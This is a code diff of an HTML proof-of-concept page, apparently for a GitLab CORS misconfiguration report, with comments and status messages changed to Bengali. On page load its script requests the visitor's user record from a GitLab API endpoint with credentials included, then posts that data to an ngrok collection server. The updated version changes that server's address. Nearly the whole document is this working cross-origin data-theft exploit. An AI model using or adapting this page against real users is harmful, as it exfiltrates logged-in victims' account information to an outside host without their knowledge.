@@ -1,27 +1,36 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"/><title>GitLab CORS PoC</title></head>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>GitLab CORS PoC</title>
+</head>
 <body>
-  <h2>Collecting user info…</h2>
+  <h2>ইউজার ইনফো সংগ্রহ করা হচ্ছে…</h2>
+
   <script>
-    // ১) GitLab API এ কল করবে, CORS এখানে '*' সেট আছে
+    // GitLab JSON API (alerts.gitlab.net) থেকে ইউজার অবজেক্ট নিয়ে POST করবে তোমার ngrok সার্ভারে
     fetch("https://alerts.gitlab.net/api/v4/user", {
       method: "GET",
       credentials: "include"
     })
-    .then(r => r.json())
+    .then(response => {
+      if (!response.ok) throw new Error("Status: " + response.status);
+      return response.json();
+    })
     .then(user => {
-      // ২) সেই ইউজার অবজেক্টকে তোমার ngrok সার্ভারে পাঠাবে
-      return fetch("https://584b8b34f84d.ngrok-free.app/collect", {
+      // ngrok এ POST করে JSON লোগ হিসেবে পাঠাবে
+      return fetch("https://cfbc1c7b7a00.ngrok-free.app/collect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(user)
       });
     })
     .then(() => {
-      document.body.innerHTML = "<h2>Done! Check your ngrok terminal.</h2>";
+      document.body.innerHTML = "<h2>সফলভাবে ইউজার ইনফো পাঠানো হয়েছে!</h2>";
     })
     .catch(err => {
-      document.body.innerHTML += "<pre>Error: " + err + "</pre>";
+      document.body.innerHTML += "<pre>ত্রুটি: " + err + "</pre>";
+      console.error(err);
     });
   </script>
 </body>
